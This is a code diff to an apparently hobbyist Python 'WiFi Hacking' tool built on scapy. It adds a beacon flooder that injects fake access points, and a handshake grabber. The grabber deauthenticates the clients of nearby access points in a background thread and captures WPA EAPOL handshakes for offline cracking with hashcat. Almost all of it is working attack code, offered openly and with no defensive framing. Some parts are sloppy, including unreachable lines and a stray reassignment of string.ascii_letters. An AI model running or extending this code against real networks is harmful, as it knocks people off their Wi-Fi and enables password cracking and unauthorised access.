@@ -13,6 +13,7 @@ console = Console()
 # NETWORK IMPORTS
 import pywifi, socket, ipaddress
 from scapy.all import sniff, RadioTap, IP, ICMP, sr1, sendp, RandMAC
+from scapy.layers.eap import EAPOL
 from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth
 
 
@@ -23,8 +24,7 @@ from nsm_files import Settings
 
 
 # ETC IMPORTS 
-import threading, os, random, time, pyttsx3
-
+import threading, os, random, time, pyttsx3, string
 
 # FILE IMPORTS
 from pathlib import Path
@@ -120,7 +120,7 @@ class Frame_Snatcher():
                     
 
     @classmethod
-    def welcome_ui(cls, text="    WiFi \nHacking", font="dos_rebel", c1="bold red", c2="bold purple", skip=False):
+    def welcome_ui(cls, iface , text="    WiFi \nHacking", font="dos_rebel", c1="bold red", c2="bold purple", skip=False):
         """This method will house the welcome message"""
 
 
@@ -137,7 +137,7 @@ class Frame_Snatcher():
             
             print('\n\n')
             console.print(welcome, style=c2)
-            console.print(f"\n[bold red]Current iface:[bold green] {cls.iface}\n\n")
+            console.print(f"\n[bold red]Current iface:[bold green] {iface}\n\n")
             if skip == False:
                 console.input("[bold red]Press ENTER to Sniff! ")
             print('\n')
@@ -859,7 +859,7 @@ class Frame_Snatcher():
                     panel.renderable = (
                         f"[{c1}]Target:[/{c1}] {target}  -  " 
                         f"[{c1}]Client:[/{c1}] {client}  -  " 
-                        f"[{c1}]Total Packets Sent:[/{c1}] {packets_sent}  -  "  
+                        f"[{c1}]Total Frames Sent:[/{c1}] {packets_sent}  -  "  
                         f"[{c1}]Reason:[/{c1}] {reasons}  -  "  
                         f"[{c1}]Clients:[/{c1}] {len(cls.clients)}"
 
@@ -928,7 +928,7 @@ class Frame_Snatcher():
             
 
             # PRINT WELCOME UI
-            Frame_Snatcher.welcome_ui(skip=skip)
+            Frame_Snatcher.welcome_ui(skip=skip, iface=cls.iface)
 
             
             # SNIFF FOR TARGETS
@@ -980,17 +980,39 @@ class Frame_Snatcher():
 
 
 
-
-
 class Beacon_Flooder():
     """This class will be responsible for creating and flooding fake APs to nearby devices"""
+    
+
+    # CLASS VARS
+    custom_ssids = [
+            "FBI_Surveillance_Van",
+            "PrettyFlyForAWiFi",
+            "ItHurtsWhenIP",
+            "DropTablesWiFi;",
+            "Virus_AP_DoNotConnect",
+            "NSA_CoffeeShop",
+            "404_WiFi_Not_Found",
+            "Free_Vbucks_5GHz",
+            "TellMyWiFiLoveHer",
+            "Barii_Hacking_You",
+            "LAN_of_the_Free",
+            "WuTangLAN",
+            "C:\Virus.exe",
+            "Give_Us_Your_Data",
+            "Pay4WiFi_Loser",
+            "Open_AP_Honeypot",
+            "DefinitelyNotAScam",
+            "Connect_And_Cry",
+            "Skynet_Online",
+            "Free_Crypto_Mining"
+        ]
 
     
     def __init__(self):
         pass
     
 
-    
     @classmethod
     def sniff_local_ssids(cls, iface):
         """This method will be used to sniff the local ssids in the area"""
@@ -1014,7 +1036,7 @@ class Beacon_Flooder():
 
                 # ATTEMPT
                 attempt += 1
-                console.print(f"Sniff Attempt #{attempt}")
+                console.print(f"[bold red]Sniff Attempt[/bold red] #{attempt}")
 
 
                 sniff(iface=iface, prn=parser, timeout=15, count=0, store=0)
@@ -1028,6 +1050,9 @@ class Beacon_Flooder():
 
                     # LEAVE
                     break
+                
+
+                time.sleep(1)
 
         
 
@@ -1045,31 +1070,29 @@ class Beacon_Flooder():
 
                 use = False
 
+
+                # RETRIEVE SSID
+                ssid = pkt[Dot11Elt].info.decode(errors="ignore") if pkt[Dot11Elt].info.decode(errors="ignore") else "Missing SSID"
+
                 
                 
                 # DESTINATION ADDR
-                if addr1 and addr1 not in ssids and use: 
+                if use:
+                    if addr1 and ssid not in ssids and use: 
 
+                        
+
+                        # APPEND
+                        ssids.append(ssid)
+
+
+                        if verbose:
+                            console.print(f"[+] Found SSID:[bold yellow] {ssid}", style="bold red")
                     
-                    # RETRIEVE SSID
-                    ssid = pkt[Dot11Elt].info.decode(errors="ignore")
-
-
-                    # APPEND
-                    ssids.append(ssid)
-
-
-                    if verbose:
-                        console.print(f"[+] Found SSID: {ssid}", style="bold red")
-                 
-               
                 
+                    
                 # SOURCE ADDR  <-- BEACON
-                elif addr2 and addr2 not in ssids:
-
-
-                    # RETRIEVE SSID
-                    ssid = pkt[Dot11Elt].info.decode(errors="ignore")
+                elif addr2 and ssid not in ssids:
 
 
                     # APPEND
@@ -1077,7 +1100,7 @@ class Beacon_Flooder():
 
 
                     if verbose:
-                        console.print(f"[+] Found SSID: {ssid}", style="bold red")
+                        console.print(f"[+] Found SSID:[bold yellow] {ssid}", style="bold red")
 
         
 
@@ -1090,22 +1113,42 @@ class Beacon_Flooder():
  
 
 
-
-
-
     @classmethod
-    def get_ssid(cls, type):
+    def get_ssid(cls, type, length=8):
         """This method will create a ssid"""
 
 
         # 1 == RANDOM
         if type == 1:
-            return random.choices()
+            return str(random.choices(cls.ssids)[0])
+        
+        
+        # SET LIST
+        elif type == 2:
+           
 
+           # SET
+           vr = cls.custom_ssids[0]
+           cls.custom_ssids.remove(vr)
+           return vr
+
+           t = random.choices(cls.custom_ssids)[0]
+           
+           s = string.ascii_letters = t
+
+           
+           #return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
+        
+
+        elif type == 3:
+            return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
+
+         
 
         pass
 
-    
+
+
     @classmethod
     def get_bssid(cls, type):
         """This method will create a bssid"""
@@ -1113,7 +1156,13 @@ class Beacon_Flooder():
         
         # 1 == RANDOM
         if type == 1:
-            return RandMAC()
+            mac = str(RandMAC())
+
+            return mac
+        
+
+        elif type == 2:
+            return "02:%02x:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(6))
 
 
         pass
@@ -1127,19 +1176,26 @@ class Beacon_Flooder():
 
         # VAR
         frames = []
+        verbose = True
+        print("\n\n")
+
+        b =  Beacon_Flooder() 
         
         while amount >= 0:
 
 
-            # GET SSID 
-            ssid = Beacon_Flooder.get_ssid()
+            # GET SSID
+            ssid =  b.get_ssid(type=1)
 
             # GET BSSID
-            bssid = Beacon_Flooder.get_bssid()
+            bssid = Beacon_Flooder.get_bssid(type=2)
 
 
             # CRAFT FRAME
-            frame = RadioTap() / Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Beacon(cap="ESS") / Dot11Elt(ID="ssid", info=ssid, len=len(ssid))
+            frame = RadioTap() /\
+                Dot11(type=0, subtype=8, addr1=client, addr2=bssid, addr3=bssid) /\
+                Dot11Beacon(cap="ESS") /\
+                Dot11Elt(ID="SSID", info=ssid.encode(), len=len(ssid))
 
 
             # APPEND AND GO
@@ -1147,13 +1203,111 @@ class Beacon_Flooder():
 
             amount -= 1
 
+
+            if verbose:
+                console.print(f"[bold red]Frame Creation --> [bold yellow]{frame}")
+
         
         # NOW RETURN THE LIST OF FRAMES
         return frames
     
    
-    
-    
+
+    @classmethod
+    def frame_injector(cls, frames, verbose=True, count=1):
+        """This method will inject the frames into the network"""
+
+
+        # VARS
+        sent = 0
+        down = 5
+
+        # PANEL
+        panel = Panel(renderable=f"Launching Attack in {down}" , title="Attack Status", style="bold yellow", border_style="bold red", expand=False)
+
+
+        # LOOP
+        with Live(panel, console=console, refresh_per_second=4):
+
+
+            # COUNT DOWN
+            while down != 0:
+                
+
+                # PANEL
+                panel.renderable = f"Launching Attack in {down}"
+                time.sleep(1)
+
+                
+                # DECREASE 
+                down -= 1
+
+            
+            # LOOP FOR ERRORS
+            while True:
+
+                try:
+
+                    frames = Beacon_Flooder.get_frames(amount=15)
+
+                    
+                    # INJECT PACKETS INTO 
+                    sendp(frames, verbose=verbose, iface=cls.iface)
+
+
+
+                    # NOTICE
+                    sent += count
+
+                   
+                    # COLORS
+                    c1 = "bold red"
+
+
+                     # UPDATE PANEL
+                    panel.renderable = (
+                        f"[{c1}]Targets:[/{c1}] {len(frames)}  -  " 
+                        f"[{c1}]Frames Sent:[/{c1}] {sent}  -  " 
+                        )
+                    
+
+
+                    # DELAY
+                    time.sleep(1.1)
+                    
+
+
+                
+                # THIS LOGIC IS TO SUBSIDIZE SENDP
+                except KeyboardInterrupt as e:
+                    console.print(f"ATTEMPTING TO ESCAPE THE MATRIX", style="bold red")
+
+                    try:
+                        time.sleep(3)
+
+                        break
+                    
+
+                    except KeyboardInterrupt as e:
+                        console.print("STOP PRESSING CTRL + C", style="bold yellow")
+
+
+                
+                # GENERAL ERRORS
+                except Exception as e:
+                    console.print(e)
+                    
+
+                    # FOR CONSISTENT ERRORS
+                    if down < 3:
+                        down += 1
+                    
+                    elif down == 4:
+                        console.print("[bold red]MAX ERRORS OCCURED: 4")
+                        time.sleep(2)
+                        break
+
+
     @classmethod
     def main(cls):
         """This is where class wide logic will be performed from"""
@@ -1164,11 +1318,341 @@ class Beacon_Flooder():
         cls.iface = Frame_Snatcher.get_interface()
 
 
+        # OUTPUT UI
+        Frame_Snatcher.welcome_ui(iface=cls.iface)
+
+
         # SNIFF AREA FOR NEARBY SSIDS
-        ssids = Beacon_Flooder.sniff_local_ssids(iface=cls.iface)
+        cls.ssids = Beacon_Flooder.sniff_local_ssids(iface=cls.iface)
+
+ 
+        # SPOOF SSIDS
+        frames = Beacon_Flooder.get_frames(amount=15)
 
 
-        console.print(ssids)
+        Beacon_Flooder.frame_injector(frames=frames)
+
+
+        console.print(frames)
+
+
+
+
+class Hash_Snatcher():
+    """This method will snatch handshakes out the air and potentially pass them to hashcat"""
+
+    
+    def __init__(self):
+        pass
+
+    
+
+
+    @classmethod
+    def sniff_for_ap(cls, iface, timeout=15):
+        """This will sniif for APs in the area"""
+
+
+
+        def sniffer():
+            """This will sniff"""
+
+
+            # VARS
+            count = 0
+
+
+           # console.print("\n ---  SNIFF STARTED  --- \n", style="bold green")
+            
+
+            # CLOSE EMPTY LIST
+            while True:
+
+                count += 1
+
+                console.print(f"Sniff Attempt #{count}", style="bold red")
+                
+                sniff(iface=iface, store=0, timeout=timeout, prn=parser)
+
+                if cls.ssids:
+
+                    # SNIFF AGAIN
+                    sniff(iface=iface, store=0, timeout=timeout, prn=parser)
+
+                    break
+                    
+
+           # console.print("\n ---  SNIFF ENDED  --- \n", style="bold red")
+
+
+        def parser(pkt):
+            """Parse packets"""
+
+
+            
+            # LAYERS
+            if pkt.haslayer(Dot11Beacon):
+
+                
+
+                # SET ADDR
+                addr1 = pkt.addr1 if pkt.addr1 != "ff:ff:ff:ff:ff:ff" else False
+                addr2 = pkt.addr2 if pkt.addr2 != "ff:ff:ff:ff:ff:ff" else False
+
+
+
+                # SET SSID
+                ssid = pkt[Dot11Elt].info.decode(errors="ignore") if pkt[Dot11Elt].info.decode(errors="ignore") else "Missing SSID"
+
+
+
+                if addr2 and ssid not in cls.ssids:
+
+                    
+                    console.print(f"[bold red][+] SSID Found:[bold yellow] {ssid}")
+                    cls.ssids.append(ssid)
+                    cls.mac_ifo.append((addr2, ssid))
+    
+
+
+        
+        # START
+        sniffer()
+
+    
+    
+    @classmethod
+    def target_attacker(cls, iface, verbose=True):
+        """This will send deauth packets to AP clients"""
+
+
+
+        def looper():
+            """Loop targets"""
+
+            
+            # VARS
+            frames = []
+
+
+
+            
+            # ITER
+            for mac in cls.mac_ifo:
+                
+                
+                # GET FRAMES // PLURAL FOR REASONS
+                ssid_frames = frame_creation(target=mac[0])
+
+
+                # APPEND
+                frames.append(ssid_frames)
+
+
+                if verbose:
+                    console.print(f"Frame Creation -->[bold green] {mac[1]}", style="bold red")
+                    time.sleep(0.05)
+ 
+                
+            
+            # DONE
+            console.print(frames)
+            console.print("\nAll frames Succesfully made!", style="bold green")
+            time.sleep(2)
+
+
+            # RETTURN RESULTS
+            return frames
+
+
+        def frame_creation(target, client="ff:ff:ff:ff:ff:ff"):
+            """This will create frames"""
+
+
+            framess = []
+
+
+            # REASON FOR KICKING
+            #reasons = [4,5,7,15]
+            
+
+            # ITERATE
+            reasons = random.choice([4,5,7,15])
+
+
+            # CRAFT FRAME
+            frame = RadioTap() / Dot11(addr1=client, addr2=target, addr3=target) / Dot11Deauth(reason=reasons)
+                
+
+            # APPEND
+            framess.append(frame)
+
+            
+
+            return frame
+
+        
+        def attack(frames, sent=50, count=10, verbose=False):
+            """Attack clients on AP's"""
+            
+
+            # VARS
+
+            
+            # LOOP ERROS
+            while sent != 0:
+                    
+                # SNATCH ERRORS
+                try:
+                
+                    # INJECT FRAMES
+                    sendp(frames, count=count, iface=iface, verbose=verbose)
+
+
+                    
+                    # ALERT
+                    console.print(f"Deauth --> {len(cls.ssids)} Targets ", style="bold red")
+
+
+                    # DOWN
+                    sent -= 1
+                    time.sleep(0.01)
+
+
+
+                # DESTROY
+                except KeyboardInterrupt as e:
+                    console.print(e)
+                
+
+                except Exception as e:
+                    console.print(f"[bold red]Exception Error:[bold yellow] {e}")
+        
+        
+        
+        # WAIT FOR THREAD
+        time.sleep(2)
+
+        # START
+        frames = looper()
+
+
+        # NOW ATTACK
+        attack(frames=frames, count=10)
+
+
+        # DONE
+        console.print("\n --- DEAUTH ENDED --- ", style="bold red")
+
+
+
+    @classmethod
+    def sniff_for_hashes(cls, iface, timeout=60):
+        """This method will be responsibe sniffing handshakes"""
+
+
+        
+
+        def sniffer():
+            """This will sniff"""
+
+            
+
+            # START SNIFF
+            console.print("\n ---  SNIFF STARTED  --- ", style="bold green")
+
+
+            # SNIFF
+            sniff(iface=iface, prn=parser, store=0, timeout=timeout)
+
+            
+
+            # SNIFF END
+            console.print("\n ---  SNIFF ENDED  --- ", style="bold red")
+
+        
+
+        def parser(pkt):
+            """This will parse that hoe"""
+
+
+
+            # ONLY EAPOL // HANDSHAKES
+            if pkt.haslayer(EAPOL):
+
+
+
+                # GET ADDR1 & ADRR2
+                addr1 = pkt.addr1 if pkt.addr1 != "ff:ff:ff:ff:ff:ff" else False
+                addr2 = pkt.addr2 if pkt.addr2 != "ff:ff:ff:ff:ff:ff" else False
+
+
+
+                if addr1:
+
+                    console.print(f"[bold red][+] HANDSHAKE Snatched:[bold yellow] {pkt}")
+
+                
+
+                if addr2:
+
+                    console.print(f"[bold red][+] HANDSHAKE Snatched:[bold yellow] {pkt}")
+
+                
+                    console.input("\nENTER TO CONTINUE: ")
+            
+
+          #  else:
+           #     console.print(pkt)
+        
+
+        
+
+        # SNIFF FOR HASHES
+        sniffer()
+    
+
+
+                     
+
+
+
+    @classmethod
+    def main(cls):
+        """This will run class wide logic"""
+
+
+
+        # CLEAN VARS
+        cls.ssids = []
+        cls.mac_ifo = []
+
+
+
+        # GET IFACE
+        cls.iface = Frame_Snatcher.get_interface()
+
+
+
+        # WELCOME
+        Frame_Snatcher.welcome_ui(iface=cls.iface)
+
+
+
+        # FIND APS
+        Hash_Snatcher.sniff_for_ap(iface=cls.iface)
+
+
+
+        # SMALL DEAUTH ON APS
+        threading.Thread(target=Hash_Snatcher.target_attacker, args=(cls.iface, ), daemon=True).start()
+        
+
+        console.print("\nBACKGROUND THREAD STARTED\n", style="bold red")
+
+
+        # SNIFF FOR HASHES
+        Hash_Snatcher.sniff_for_hashes(iface=cls.iface, timeout=60*3)
 
 
 
@@ -1303,7 +1787,7 @@ class You_Cant_DOS_ME():
 if __name__ == "__main__":
     
 
-    use = 3
+    use = 4
 
 
     if use == 1:
@@ -1321,38 +1805,13 @@ if __name__ == "__main__":
 
         Beacon_Flooder.main()
 
+    
+
+    elif use == 4:
+        Hash_Snatcher.main()
 
 
-        from scapy.all import *
-        import random
-        import string
-        import time
 
-        iface = "wlan0"  # Set to your monitor-mode interface
+s = string.ascii_letters = "heyy"
 
-        def random_mac():
-            return "02:%02x:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(6))
-
-        def random_ssid(length=8):
-            return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
-
-        def create_beacon(ssid, bssid):
-            dot11 = Dot11(type=0, subtype=8,
-                        addr1="ff:ff:ff:ff:ff:ff",
-                        addr2=bssid,
-                        addr3=bssid)
-            beacon = Dot11Beacon(cap="ESS")
-            essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
-            pkt = RadioTap()/dot11/beacon/essid
-            return pkt
-
-        while True:
-            pkts = []
-            for _ in range(30):  # generate 5 SSIDs
-                ssid = random_ssid(random.randint(6, 12))
-                bssid = random_mac()
-                pkt = create_beacon(ssid, bssid)
-                pkts.append(pkt)
-
-            sendp(pkts, iface=iface, verbose=0)
-            time.sleep(0.1)  # small delay to keep from overwhelming your adapter
+console.print(s)
